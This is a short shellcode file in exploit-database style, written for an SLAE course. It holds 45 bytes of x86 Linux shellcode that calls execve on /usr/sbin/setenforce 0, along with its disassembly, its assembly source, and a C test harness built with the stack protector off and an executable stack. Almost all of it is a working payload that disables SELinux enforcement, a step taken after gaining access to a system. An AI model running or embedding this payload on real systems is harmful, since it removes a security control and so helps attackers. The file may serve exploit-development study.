/*
# Title: x86 SELinux change between permissive and enforcing modes shellcode
# Date: 20-02-2017
# Author: lu0xheap
# Platform: Lin_x86
# Tested on: CentOS 6.8 (i686)
# Shellcode Size: 45 bytes
# ID: SLAE - 871
*/

/*
1. Description:

SELinux mode switcher. Permissive = "\x30"; Enforcing = "\x31"
gcc -fno-stack-protector -z execstack SELinux-mode.c -o SELinux-mode

2. Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 0b                	push   0xb
 8048062:	58                   	pop    eax
 8048063:	31 d2                	xor    edx,edx
 8048065:	52                   	push   edx
 8048066:	6a 30                	push   0x30
 8048068:	89 e1                	mov    ecx,esp
 804806a:	52                   	push   edx
 804806b:	68 6f 72 63 65       	push   0x6563726f
 8048070:	68 74 65 6e 66       	push   0x666e6574
 8048075:	68 6e 2f 73 65       	push   0x65732f6e
 804807a:	68 2f 73 62 69       	push   0x6962732f
 804807f:	68 2f 75 73 72       	push   0x7273752f
 8048084:	89 e3                	mov    ebx,esp
 8048086:	52                   	push   edx
 8048087:	51                   	push   ecx
 8048088:	53                   	push   ebx
 8048089:	89 e1                	mov    ecx,esp
 804808b:	cd 80                	int    0x80

3. Code

global _start
section .text
_start:
	push 0xb
        pop eax
	xor edx, edx
	push edx
	push byte 0x30
	mov ecx, esp
	push edx
	push 0x6563726f
	push 0x666e6574
	push 0x65732f6e
	push 0x6962732f
	push 0x7273752f
	mov ebx, esp
	push edx
	push ecx
	push ebx
	mov ecx, esp
	int 0x80
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x6a\x0b\x58\x31\xd2\x52\x6a"
"\x30"
"\x89\xe1\x52\x68\x6f\x72\x63\x65"
"\x68\x74\x65\x6e\x66\x68\x6e\x2f"
"\x73\x65\x68\x2f\x73\x62\x69\x68"
"\x2f\x75\x73\x72\x89\xe3\x52\x51"
"\x53\x89\xe1\xcd\x80";

main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}